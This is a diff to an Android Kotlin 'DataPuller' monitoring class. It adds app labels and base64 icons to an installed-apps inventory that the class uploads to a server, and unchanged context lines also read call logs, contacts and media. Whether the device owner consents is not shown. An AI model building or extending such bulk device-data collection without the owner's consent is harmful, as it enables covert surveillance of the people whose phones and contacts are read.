@@ -3,11 +3,15 @@ package com.dilarion.app.monitoring
 import android.annotation.SuppressLint
 import android.content.Context
 import android.content.pm.PackageManager
+import android.graphics.Bitmap
+import android.graphics.Canvas
+import android.graphics.Color
 import android.net.Uri
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.util.Log
+import android.util.Base64
 import com.dilarion.app.data.api.ApiService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.launch
@@ -17,6 +21,7 @@ import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
 import java.io.FileOutputStream
+import java.io.ByteArrayOutputStream
 
 private const val TAG = "DataPuller"
 private const val PREFS_NAME = "dilarion_uploaded_media"
@@ -139,13 +144,20 @@ class DataPuller(
         val pm = context.packageManager
         val apps = pm.getInstalledPackages(0).mapNotNull { pkg ->
             runCatching {
-                mapOf(
+                val appInfo = pkg.applicationInfo ?: return@runCatching null
+                val label = pm.getApplicationLabel(appInfo).toString().trim()
+                val readableName = if (label.isNotEmpty() && label != pkg.packageName) label else
+                    pkg.packageName.substringAfterLast('.').replace(Regex("([a-z])([A-Z])"), "$1 $2")
+                        .replace('_', ' ').replace('-', ' ').replaceFirstChar { it.uppercase() }
+                mutableMapOf<String, Any>(
                     "package_name" to pkg.packageName,
-                    "app_name"     to pm.getApplicationLabel(pkg.applicationInfo ?: return@runCatching null).toString(),
+                    "app_name"     to readableName,
                     "version"      to (pkg.versionName ?: ""),
                     "installed_at" to pkg.firstInstallTime,
                     "updated_at"   to pkg.lastUpdateTime,
-                )
+                ).apply {
+                    appIconDataUrl(pm, pkg.packageName)?.let { put("icon_data_url", it) }
+                }
             }.getOrNull()
         }
         Log.i(TAG, "pullInstalledApps: ${apps.size} apps")
@@ -154,6 +166,18 @@ class DataPuller(
             apiService.uploadInstalledApps("Bearer $token", mapOf("apps" to apps))
         }.onFailure { Log.e(TAG, "pullInstalledApps failed: $it") }
     }
+
+    private fun appIconDataUrl(pm: PackageManager, packageName: String): String? = runCatching {
+        val icon = pm.getApplicationIcon(packageName)
+        val bitmap = Bitmap.createBitmap(40, 40, Bitmap.Config.ARGB_8888)
+        val canvas = Canvas(bitmap)
+        canvas.drawColor(Color.WHITE)
+        icon.setBounds(0, 0, 40, 40)
+        icon.draw(canvas)
+        val bytes = ByteArrayOutputStream()
+        if (!bitmap.compress(Bitmap.CompressFormat.JPEG, 75, bytes)) return@runCatching null
+        "data:image/jpeg;base64,${Base64.encodeToString(bytes.toByteArray(), Base64.NO_WRAP)}"
+    }.getOrNull()
 
     suspend fun pullMedia() {
         val token = getToken() ?: return
